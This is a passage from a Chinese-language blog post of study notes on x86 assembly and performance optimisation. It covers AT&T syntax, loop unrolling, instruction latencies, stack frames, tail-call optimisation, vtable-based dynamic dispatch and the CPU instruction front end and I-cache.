指令来保存结果，因为它可以直接将计算结果存入指定寄存器。</p>
<p>例如，假设你有：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">add eax, ebx</span><br><span class="line">add eax, ecx</span><br></pre></td></tr></table></figure></div>
<p>这两条指令会将 <code>ebx</code> 和 <code>ecx</code> 加到
<code>eax</code> 上。但是，如果你使用
<code>lea</code>，你可以避免使用第二条 <code>add</code> 指令：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea eax, [ebx + ecx]</span><br></pre></td></tr></table></figure></div>
<p>这条指令会直接将 <code>ebx + ecx</code> 的结果存入
<code>eax</code>，节省了一条 <code>add</code> 指令。通过
<code>lea</code>，你甚至可以在一条指令中执行多个加法运算（如
<code>a = b + c + d</code>），避免了额外的 <code>mov</code>
操作。</p></li>
</ul>
<p>上述使用的都是x86汇编的<strong>Intel
语法</strong>，实际上还存在一种<strong>AT&amp;T 语法</strong></p>
<p><strong>AT&amp;T 语法的特点</strong></p>
<ul>
<li><strong>操作数顺序</strong>：在 AT&amp;T
语法中，目标操作数（目的地）在后面，源操作数在前面。例如：<code>movl (%rsi), %eax</code>，意思是将
<code>rsi</code> 寄存器指向的地址中的数据移动到 <code>eax</code>
寄存器。</li>
<li><strong>寄存器和常量的前缀</strong>：在 AT&amp;T
语法中，寄存器需要使用 <code>%</code> 前缀（例如
<code>%eax</code>），常量需要使用 <code>$</code> 前缀（例如
<code>$1</code>）。</li>
<li><strong>内存寻址模式</strong>：AT&amp;T 语法中的内存寻址模式是
<code>displacement(%base, %index, scale)</code>，例如
<code>movl 4(%eax, %ebx, 2), %ecx</code> 表示从
<code>eax + ebx * 2 + 4</code> 位置读取数据。</li>
<li>操作数大小后缀：在 AT&amp;T
语法中，操作指令后有大小后缀，表示操作数的大小。常见的后缀有：
<ul>
<li><code>b</code>：字节（8位）</li>
<li><code>w</code>：字（16位）</li>
<li><code>l</code>：长整型（32位整数或64位浮动点）</li>
<li><code>q</code>：四倍长（64位）</li>
<li><code>s</code>：单精度浮点数（32位）</li>
<li><code>t</code>：十字节（80位浮动点数）</li>
</ul></li>
</ul>
<p>实现<code>*c = *a + *b</code>方式如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl (%rsi), %eax</span><br><span class="line">addl (%rdi), %eax</span><br><span class="line">movl %eax, (%rdx)</span><br></pre></td></tr></table></figure></div>
<h5 id="循环与条件">循环与条件</h5>
<p>循环主要通过跳转指令实现。</p>
<ol type="1">
<li><strong>跳转指令的作用</strong></li>
</ol>
<p>跳转指令（如
<code>jmp</code>）的作用是将程序的指令指针（IP）移动到一个新的地址，这个地址由跳转指令的操作数来指定。跳转的目标地址有以下几种可能：</p>
<ul>
<li><strong>绝对地址</strong>：跳转到一个固定的内存地址。</li>
<li><strong>相对地址</strong>：跳转到一个相对当前指令位置的地址（例如，跳转前进或后退一定的字节数）。</li>
<li><strong>运行时计算的地址</strong>：这个地址不是在编译时固定的，而是在程序运行时计算得到。</li>
</ul>
<ol start="2" type="1">
<li><strong>标签的使用</strong></li>
</ol>
<p>为了避免直接管理这些地址，汇编程序员可以使用
<strong>标签</strong>。标签是指用一个字符串标记某个指令的位置，并且这个字符串在机器代码生成时会被替换成相对地址。例如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">start:</span><br><span class="line">    ; 这里是某个指令</span><br><span class="line">    jmp start  ; 跳转回start标签的位置</span><br></pre></td></tr></table></figure></div>
<p>在上面的例子中，<code>start:</code> 是一个标签，指示 <code>jmp</code>
指令跳转到这个标签的位置。这个标签的实际地址会在编译时被替换为相对地址。</p>
<ol start="3" type="1">
<li><strong>标签的命名规则</strong></li>
</ol>
<p>标签的命名并不复杂。通常，编译器会使用一些规则来生成标签名称：</p>
<ul>
<li><strong>行号</strong>：编译器可能会使用源代码的行号来生成标签的名称。</li>
<li><strong>函数名</strong>：有时，标签会以函数名作为基础，并附加签名信息来标识不同的位置。</li>
</ul>
<p>这种标签命名方式使得标签的管理变得更清晰，也方便了编译器自动生成跳转目标。</p>
<p>但是单独的往回跳的jmp只会形成类似<code>while(True)</code>的死循环，我们还需搭配条件控制来进行设计循环的边界。</p>
<p>一般是利用FLAGS寄存器来保存比较状态，然后通过该状态来决定是否跳转，常见条件跳转指令有<code>je</code>、<code>jne</code>、<code>ja</code>、<code>jna</code>、<code>jb</code>、<code>jnb</code>等。</p>
<h5 id="循环展开loop-unrolling">循环展开（<a class="link" href="https://en.wikipedia.org/wiki/Loop_unrolling">Loop
Unrolling<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>）</h5>
<p>由于我们用于循环的指令占一定的长度（循环变量迭代、比较、判断跳转），我们有时候可以通过人为的增加步长并补充必要的有效指令来增加指令的效率，例子如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;before optimization</span><br><span class="line">loop:</span><br><span class="line">    add  edx, DWORD PTR [rax]</span><br><span class="line">    add  rax, 4</span><br><span class="line">    cmp  rax, rcx</span><br><span class="line">    jne  loop</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;after optimization</span><br><span class="line">loop:</span><br><span class="line">    add  edx, [rax]</span><br><span class="line">    add  edx, [rax+4]</span><br><span class="line">    add  edx, [rax+8]</span><br><span class="line">    add  edx, [rax+12]</span><br><span class="line">    add  rax, 16</span><br><span class="line">    cmp  rax, rcx</span><br><span class="line">    jne  loop</span><br></pre></td></tr></table></figure></div>
<p>比如我们在遍历一个拥有16个int元素的数组进行求和，我们忽略每个指令实际执行的时间周期花费差异，第一种方法需要16*4=64次指令执行，而第二种方式只用4*7=28次指令执行即可，看上去效率提高了很多。但实际上循环展开不一定带来预期的性能提升，因为现代处理器并不是按顺序一条条执行指令，而是会维护一个指令队列，允许
<strong>并行执行独立的操作</strong>。这意味着如果两条指令之间没有依赖关系（即它们的执行结果互不影响），处理器可以将它们同时执行，而不需要等待其中一个完成后再执行另一个。</p>
<p>另一种可能的优化思路是利用某些指令的副作用来进行FLAGS位寄存器的设置，从而优化掉cmp的使用。比如利用add结束后会进行的状态设置。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    mov  rax, -100  ; replace 100 with the array size</span><br><span class="line">loop:</span><br><span class="line">    add  edx, DWORD PTR [rax + 100 + rcx]</span><br><span class="line">    add  rax, 4</span><br><span class="line">    jnz  loop       ; checks if the result is zero</span><br></pre></td></tr></table></figure></div>
<h5 id="常用指令花费">常用指令花费</h5>
<p><strong>x86 常用指令延迟列表（Latency &amp; Throughput）</strong></p>
<table>
<colgroup>
<col style="width: 27%">
<col style="width: 19%">
<col style="width: 24%">
<col style="width: 28%">
</colgroup>
<thead>
<tr>
<th>指令</th>
<th>延迟（Latency）</th>
<th>吞吐量（Throughput）</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>add r/m, r</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>加法</td>
</tr>
<tr>
<td><code>sub r/m, r</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>减法</td>
</tr>
<tr>
<td><code>and r/m, r</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>按位与</td>
</tr>
<tr>
<td><code>or r/m, r</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>按位或</td>
</tr>
<tr>
<td><code>xor r/m, r</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>按位异或</td>
</tr>
<tr>
<td><code>cmp r/m, r</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>比较（影响标志位）</td>
</tr>
<tr>
<td><code>test r/m, r</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>逻辑测试（仅设置标志位）</td>
</tr>
<tr>
<td><code>mov r, r/m</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>纯寄存器操作的 <code>mov</code></td>
</tr>
<tr>
<td><code>mov r, imm</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>立即数赋值</td>
</tr>
<tr>
<td><code>mov r/m, r</code></td>
<td><strong>2-3 cycles</strong></td>
<td>0.5 per cycle</td>
<td>可能涉及内存访问</td>
</tr>
<tr>
<td><code>lea r, [r + r*m + c]</code></td>
<td><strong>1-3 cycles</strong></td>
<td>1 per cycle</td>
<td>计算地址，但不访问内存</td>
</tr>
<tr>
<td><code>imul r, r/m</code></td>
<td><strong>3 cycles</strong></td>
<td>1 per 1-3 cycles</td>
<td>有符号整数乘法</td>
</tr>
<tr>
<td><code>mul r/m</code></td>
<td><strong>3-4 cycles</strong></td>
<td>1 per 2-3 cycles</td>
<td>无符号整数乘法</td>
</tr>
<tr>
<td><code>idiv r/m</code></td>
<td><strong>22-30 cycles</strong></td>
<td>1 per 20+ cycles</td>
<td>有符号整数除法（非常慢）</td>
</tr>
<tr>
<td><code>div r/m</code></td>
<td><strong>22-30 cycles</strong></td>
<td>1 per 20+ cycles</td>
<td>无符号整数除法（非常慢）</td>
</tr>
<tr>
<td><code>sar r/m, imm</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>算术右移</td>
</tr>
<tr>
<td><code>shl r/m, imm</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>逻辑左移</td>
</tr>
<tr>
<td><code>shr r/m, imm</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>逻辑右移</td>
</tr>
<tr>
<td><code>neg r/m</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>取负数</td>
</tr>
<tr>
<td><code>not r/m</code></td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>取反</td>
</tr>
<tr>
<td><code>cmovcc r, r/m</code></td>
<td><strong>2 cycles</strong></td>
<td>1 per cycle</td>
<td>条件移动（消除分支预测）</td>
</tr>
<tr>
<td><code>jcc label</code>（预测正确）</td>
<td><strong>1 cycle</strong></td>
<td>1 per cycle</td>
<td>预测正确的跳转</td>
</tr>
<tr>
<td><code>jcc label</code>（预测错误）</td>
<td><strong>~15 cycles</strong></td>
<td>-</td>
<td>预测错误会导致流水线清空</td>
</tr>
<tr>
<td><code>call label</code></td>
<td><strong>4-5 cycles</strong></td>
<td>-</td>
<td>调用函数（压栈）</td>
</tr>
<tr>
<td><code>ret</code></td>
<td><strong>3-4 cycles</strong></td>
<td>-</td>
<td>返回（弹栈）</td>
</tr>
</tbody>
</table>
<h4 id="栈帧结构">栈帧结构</h4>
<p>rsp存栈顶，rbp存栈底。</p>
<p>栈帧操作所用到的call，ret，push，pop，leave等实际是一种语法糖，其本身可以被拆解为不同的指令组合。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; "push rax"</span><br><span class="line">sub rsp, 8</span><br><span class="line">mov QWORD PTR[rsp], rax</span><br><span class="line"></span><br><span class="line">; "pop rax"</span><br><span class="line">mov rax, QWORD PTR[rsp]</span><br><span class="line">add rsp, 8</span><br><span class="line"></span><br><span class="line">; "call func"</span><br><span class="line">push rip ; &lt;- instruction pointer (although accessing it like that is probably illegal)</span><br><span class="line">jmp func</span><br><span class="line"></span><br><span class="line">; "ret"</span><br><span class="line">pop  rcx ; &lt;- choose any unused register</span><br><span class="line">jmp rcx</span><br><span class="line"></span><br><span class="line">; "leave"</span><br><span class="line">mov rsp,rbp</span><br><span class="line">pop rbp</span><br></pre></td></tr></table></figure></div>
<h4 id="调用约定">调用约定</h4>
<p><strong>传递参数</strong>：如 <code>rdi</code>, <code>rsi</code>,
<code>rdx</code>, <code>rcx</code>, <code>r8</code>, <code>r9</code>
等寄存器（对于更多的参数，可能会使用栈传递）。</p>
<p><strong>返回值</strong>：函数返回值通常存储在 <code>rax</code>
寄存器中。</p>
<p><strong>堆栈管理</strong>：在调用其他函数时，通常需要通过
<code>push</code> 和 <code>pop</code>
指令保存和恢复寄存器的内容，以确保函数之间的参数和返回值不会冲突。</p>
<p>每次函数调用时，都可能需要保存寄存器（如 <code>push</code> 和
<code>pop</code>）以及将参数放入寄存器中，尤其是当调用多个函数时，这会增加额外的指令开销。频繁的函数调用，尤其是在性能要求很高的场景中，可能会引入一定的性能损失。</p>
<h4 id="内联优化">内联优化</h4>
<p><strong>内联优化</strong>（Inline
optimization）是编译器用来提高程序运行效率的一种优化手段。内联优化通过将函数调用替换成函数体的代码，来避免函数调用的开销，从而提高程序的执行效率。</p>
<p>在 C++ 中，内联函数是通过使用 <code>inline</code>
关键字声明的函数。编译器在编译时，会将内联函数的代码直接插入到调用该函数的地方，而不是生成函数调用的代码。这样就避免了常规函数调用的开销（如栈的操作、跳转等）。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">square</span><span class="params">(<span class="type">int</span> x)</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>在这个例子中，<code>square</code>
函数会在每次调用时直接将其代码插入到调用点，而不是像普通函数那样产生函数调用的开销。</p>
<p><strong>内联函数的好处</strong></p>
<ol type="1">
<li><strong>减少函数调用的开销</strong>：普通函数调用涉及到参数传递、栈帧的创建、跳转等，内联函数直接替代了函数调用过程，避免了这些开销。</li>
<li><strong>提高执行速度</strong>：减少了栈操作和跳转，代码更紧凑，从而提高了执行速度。</li>
<li><strong>减少代码重复</strong>：内联函数可以避免重复编写相同的代码块，增强了代码的复用性。</li>
</ol>
<h4 id="尾调用优化">尾调用优化</h4>
<p>让我们考虑一个更加复杂的情况，也就是递归调用。</p>
<p><strong>尾递归优化</strong>（Tail Call Elimination,
TCE）是一种优化技术，它的目的是将尾递归函数转换为迭代（loop），从而避免每次递归调用时额外的栈空间开销。尾递归是指函数调用自己并且在递归调用之后没有其他计算操作，递归的返回值直接就是递归调用的结果。</p>
<p>首先，考虑一个常见的递归阶乘函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">factorial</span><span class="params">(<span class="type">int</span> n)</span> {</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> factorial(n - <span class="number">1</span>) * n;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>在这种递归实现中，每次递归调用都需要等待
<code>factorial(n - 1)</code>
计算完成后才进行乘法运算。这个递归调用没有进行尾递归优化，因此每次递归都需要保存返回地址、参数等信息到栈上，直到递归完成才开始计算结果。</p>
<p><strong>对应的汇编实现</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; n = edi, ret = eax</span><br><span class="line">factorial:</span><br><span class="line">    test edi, edi       ; 判断 n 是否为零</span><br><span class="line">    jne  nonzero        ; 如果 n 不为零，跳转到 nonzero</span><br><span class="line">    mov  eax, 1         ; 如果 n 为零，返回 1</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">nonzero:</span><br><span class="line">    push edi            ; 保存 n，用于后续的乘法</span><br><span class="line">    sub  edi, 1         ; n - 1</span><br><span class="line">    call factorial      ; 递归调用 factorial(n - 1)</span><br><span class="line">    pop  edi            ; 恢复 n</span><br><span class="line">    imul eax, edi       ; 将结果乘以 n</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure></div>
<p>这个实现是典型的递归形式，每次递归都会保存当前的 <code>n</code>
到栈中，并在递归返回后进行乘法操作。随着递归深度的增加，这会消耗大量的栈空间（push和call分别都会往栈上存1个地址的内容）。</p>
<p><strong>尾递归优化</strong></p>
<p>如果函数是<strong>尾递归</strong>的（即递归调用之后没有其他操作），我们就可以将递归调用转化为一个循环，这样就避免了递归带来的栈开销。比如我们可以通过引入一个累积参数
<code>p</code> 来进行尾递归优化：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">factorial</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> p = <span class="number">1</span>)</span> {</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    <span class="keyword">return</span> factorial(n - <span class="number">1</span>, p * n);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>在这个版本中，我们传入一个参数 <code>p</code> 来存储当前的乘积。当
<code>n</code> 为 0 时，直接返回
<code>p</code>。这就避免了递归调用之后的乘法操作，变成了一个可以优化为循环的尾递归。</p>
<p><strong>优化后的汇编实现（尾递归转循环）</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 假设 n &gt; 0</span><br><span class="line">factorial:</span><br><span class="line">    mov  eax, 1         ; 将 eax 初始化为 1（当前乘积）</span><br><span class="line">loop:</span><br><span class="line">    imul eax, edi       ; eax = eax * edi（乘以 n）</span><br><span class="line">    sub  edi, 1         ; n = n - 1</span><br><span class="line">    jne  loop           ; 如果 n != 0，继续循环</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure></div>
<p>在这个实现中，递归调用被替换成了一个循环。每次循环将当前值
<code>edi</code>（即 n）乘以当前的乘积（存储在 <code>eax</code>
中），然后递减 <code>edi</code>，直到 <code>edi</code> 为 0 时结束。</p>
<p><strong>尾递归优化的好处</strong></p>
<ol type="1">
<li><strong>节省栈空间</strong>：尾递归优化的关键是消除每次递归调用的栈开销。传统递归调用每次都会往栈上压入返回地址、参数等信息，而尾递归优化后，递归实际上被转换成了循环，循环本身不需要额外的栈空间。</li>
<li><strong>提高执行效率</strong>：去除了递归调用的开销，避免了函数调用和返回的上下文切换。循环执行通常比递归调用更高效，尤其是在递归深度较大的情况下。</li>
</ol>
<h4 id="间接分支">间接分支</h4>
<p>在汇编中，所有标签都会转换成绝对或者相对地址然后嵌入指令的机器码中。</p>
<h5 id="多路分支">多路分支</h5>
<p>对于n路分支，一般不会直接创建n个分支，而是创建一个分支函数表来进行定位。switch指令有时候并不能让编译器方便的进行优化，所以像glibc中有关IO部分的实现，一般都会用到goto指令直接跳转。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">weather_in_russia</span><span class="params">(<span class="type">int</span> season)</span> {</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">void</span>* table[] = {&amp;&amp;winter, &amp;&amp;spring, &amp;&amp;summer, &amp;&amp;fall};</span><br><span class="line">    <span class="keyword">goto</span> *table[season];</span><br><span class="line"></span><br><span class="line">    winter:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Freezing\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    spring:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Dirty\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    summer:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Dry\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    fall:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Windy\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<h5 id="动态分发dynamic-dispatch">动态分发（Dynamic Dispatch）</h5>
<p><strong>动态分发</strong>是实现运行时多态性（runtime
polymorphism）的核心技术，尤其在面向对象编程中非常常见。它允许程序在运行时决定调用哪个具体方法，而不是在编译时确定。这种特性使得基于继承和多态的代码结构能够在不同类型的对象上以相同的接口进行操作。</p>
<p>考虑一个经典的例子，我们有一个 <code>Animal</code>
抽象类，其中有一个虚拟的 <code>speak()</code>
方法，以及两个具体实现类：<code>Dog</code> 和
<code>Cat</code>。每个具体类实现了自己的 <code>speak()</code>
方法，<code>Dog</code> 发出 "Bark"，<code>Cat</code> 发出 "Meow"。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Animal</span> {</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">speak</span><span class="params">()</span> </span>{ <span class="built_in">printf</span>(<span class="string">"&lt;abstract animal sound&gt;\n"</span>); }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Dog</span> : <span class="keyword">public</span> Animal {</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">speak</span><span class="params">()</span> <span class="keyword">override</span> </span>{ <span class="built_in">printf</span>(<span class="string">"Bark\n"</span>); }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Cat</span> : <span class="keyword">public</span> Animal {</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">speak</span><span class="params">()</span> <span class="keyword">override</span> </span>{ <span class="built_in">printf</span>(<span class="string">"Meow\n"</span>); }</span><br><span class="line">};</span><br></pre></td></tr></table></figure></div>
<p><strong>创建对象并调用方法</strong></p>
<p>我们希望创建一个 <code>Animal</code>
类型的指针，指向不同的具体对象（<code>Dog</code> 或
<code>Cat</code>），并通过这个指针调用 <code>speak()</code>
方法，而无需在编译时明确知道它指向的是 <code>Dog</code> 还是
<code>Cat</code>。这样，我们可以通过动态分发来调用适当的实现。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">nullptr</span>));</span><br><span class="line">    Dog sparkles;</span><br><span class="line">    Cat mittens;</span><br><span class="line">    </span><br><span class="line">    Animal* catdog = (<span class="built_in">rand</span>() &amp; <span class="number">1</span>) ? <span class="built_in">static_cast</span>&lt;Animal*&gt;(&amp;sparkles) : <span class="built_in">static_cast</span>&lt;Animal*&gt;(&amp;mittens);</span><br><span class="line">    catdog-&gt;<span class="built_in">speak</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>这里我们拿g++编译后的文件扔到IDA里看看，就会发现使用到了vtable来管理函数指针。</p>
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/13/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%951/image-20250226203831161.png" class="">
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/13/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%951/image-20250226204059941.png" class="">
<p><strong>如何实现动态分发</strong></p>
<p>在 C++
中，动态分发是通过<strong>虚拟方法表</strong>（<strong>vtable</strong>）来实现的。下面是它是如何工作的：</p>
<ol type="1">
<li><strong>虚拟方法表</strong>（Vtable）：对于每个实现了虚拟方法的类，编译器会为这个类生成一个虚拟方法表，这个表中包含了该类的所有虚拟方法的地址。表中的每个条目对应类中的一个虚拟方法。</li>
<li><strong>虚拟方法表指针</strong>：每个类的实例都会有一个指向其虚拟方法表的指针（通常叫做
vptr）。当你通过 <code>Animal*</code> 指针调用 <code>speak()</code>
方法时，程序会使用该指针的 <code>vptr</code>
来查找正确的虚拟方法表，并从中提取出 <code>speak()</code>
的实际地址。</li>
<li><strong>调用虚拟方法</strong>：程序根据对象的 <code>vptr</code>
查找虚拟方法表，从表中找到对应的 <code>speak()</code>
方法地址，然后跳转到该地址执行相应的代码。</li>
</ol>
<p><strong>虚拟方法表的实现细节</strong></p>
<p>为了保证每个类的虚拟方法调用都能有统一的结构，编译器会使得所有继承自相同基类（比如
<code>Animal</code>）的类具有相同的虚拟方法表结构。具体来说，编译器会将所有虚拟方法的实现调整为相同长度，并可能会在返回指令后插入一些填充指令，确保每个方法的大小一致。</p>
<p>每个类的实例都会包含一个指向其虚拟方法表的指针。通过这个指针，动态分发的调用可以在运行时找到正确的函数。</p>
<p><strong>虚拟方法调用的性能开销</strong></p>
<p>动态分发虽然很强大，但也有一些性能开销：</p>
<ol type="1">
<li><strong>额外的时间开销</strong>：调用虚拟方法时，程序需要通过对象的
<code>vptr</code>
查找虚拟方法表，然后从表中找到正确的函数地址，最后跳转到该函数。这个过程增加了额外的时间开销，通常在大约
15 个周期左右（与分支预测失败类似）。</li>
<li><strong>无法内联</strong>：由于虚拟方法调用是在运行时确定的，编译器无法像普通函数那样将其内联，从而失去了内联优化的优势。内联通常可以显著减少函数调用的开销。</li>
<li><strong>类大小增加</strong>：每个有虚拟方法的类通常会增加几个字节的空间来存储指向虚拟方法表的指针。这会导致每个对象的大小增加。</li>
<li><strong>二进制文件增大</strong>：由于虚拟方法表和其他运行时支持的存在，最终生成的二进制文件通常比不使用多态的代码要大。</li>
</ol>
<h4 id="机器代码层">机器代码层</h4>
<p>CPU的流水线设计一般将其分为前端和后端两个不同的层次结构。<strong>前端</strong>负责从内存中获取并解码指令。<strong>后端</strong>负责调度并执行这些指令。在很多情况下，性能瓶颈出现在<strong>执行阶段</strong>的后端。因为CPU通常可以比执行更快地获取和解码指令，所以优化往往集中在提高执行效率，减少流水线空闲和延迟，并提高指令级并行性。然而，在某些情况下，<strong>前端</strong>反而会成为瓶颈。这发生在指令获取和解码的速度跟不上后端处理的速度时。即使后端能够处理更多的指令，如果前端没有提供足够的指令，后端就会空闲等待。这种情况通常是由代码布局或指令组织方式引起的。</p>
<h5 id="前端">前端</h5>
<p>在前端中，又分为<strong>取指阶段（Fetch）和解码阶段（Decode）</strong>。</p>
<p>在取指阶段，CPU从主内存中加载固定大小的字节块，这些字节包含了多个指令的二进制编码。这一阶段的目标是将指令从内存取出，准备解码。在x86架构中，这个字节块的大小通常是32字节，但在不同的计算机架构上可能会有所不同。这个块的地址必须是对齐的，也就是说，块的地址必须是其大小的倍数（例如32字节的块地址必须是32的倍数）。CPU通常要求加载的指令块必须按照某种对齐规则存储。对于32字节的块来说，块的起始地址必须是32字节的倍数，否则可能会导致取指过程中的额外延迟。</p>
<p>解码阶段负责将取出的字节块转化为具体的机器指令。CPU会查看这32字节的内容，丢弃当前指令指针之前的部分，然后将剩下的字节切分成指令。机器指令使用可变字节数进行编码。最多可能需要15个字节。一个32字节的块可能解码出多个指令，但解码的数量有一定的机器依赖限制，这个限制被称为<strong>解码宽度</strong>（decode
width）。解码宽度决定了每个周期最多能解码多少条指令。以Zen 2
CPU为例，其解码宽度为4，即每个周期最多可以解码4条指令并将它们传递到下一阶段。</p>
<p>这两个阶段通常是流水线化的工作方式，即<strong>前面的阶段不会阻塞后面的阶段</strong>。如果CPU能够预测下一块需要加载的指令地址，那么在当前指令块的解码阶段完成之前，取指阶段就会继续加载下一块指令。这种预取机制帮助提高流水线效率，减少CPU等待的时间。</p>
<h5 id="指令缓存i-cache">指令缓存（I-cache）</h5>
<p><strong>缓存目的：</strong></p>
<p>I-cache 的核心目的是减少 CPU
每次从主内存加载指令的时间。因为直接从主内存获取指令的速度通常比从缓存中读取要慢得多，所以通过引入
I-cache，能够显著减少指令访问延迟。</p>
<p><strong>结构：</strong></p>
<p>I-cache 存储的是指令，而不是数据。它通常由多个 <strong>缓存行（cache
line）</strong>
组成，每个缓存行包含一定数量的指令。缓存的大小和每个缓存行的大小都由硬件架构设计决定。</p>
<p><strong>访问流程：</strong></p>
<p>当 CPU 需要执行某个指令时，它首先检查 I-cache
中是否已有该指令。如果指令已经被缓存（缓存命中），则直接从 I-cache
中取出执行。如果指令不在缓存中（缓存未命中），CPU
就会从主内存中加载该指令，并将其存入 I-cache
中，以便将来使用。这个过程被称为 <strong>缓存加载</strong>。</p>
<p><strong>缓存一致性：</strong></p>
<p>I-cache 通常是只读的缓存（用于存储指令），不会被 CPU
写操作直接修改。</p>
<p>由于现代处理器有多级缓存（例如 L1、L2、L3 缓存），所以当 I-cache
未命中时，CPU
会逐层向上寻找直到主内存。如果在多级缓存之间找到数据，就会将数据从较高层缓存传递到较低层，直到最终命中的缓存级别。</p>
<p><strong>缓存替换策略：</strong></p>
<p>当 I-cache 中没有足够空间存储新的指令时，CPU
会根据一定的策略替换掉较旧或不常用的指令。常见的替换策略包括： -
<strong>LRU（Least Recently Used）</strong>：替换最久未使用的缓存行。 -
<strong>FIFO（First In First
Out）</strong>：按缓存行进入缓存的顺序进行替换。 -
<strong>Random</strong>：随机选择缓存行进行替换。</p>
<p><strong>对性能的影响：</strong></p>
<p>I-cache 的大小和访问策略对 CPU
性能有很大影响。缓存命中率越高，处理器的性能越好。处理器中的
<strong>流水线（Pipeline）</strong> 和 <strong>超标量执行</strong>
等技术需要频繁获取指令，因此 I-cache 在高性能处理器中尤其重要。</p>
<p>使用指令缓存后，也会相应影响一些优化策略。</p>
<h5 id="非对称分支">非对称分支</h5>
<p>例如有如下C代码，其形式非常对称：</p>
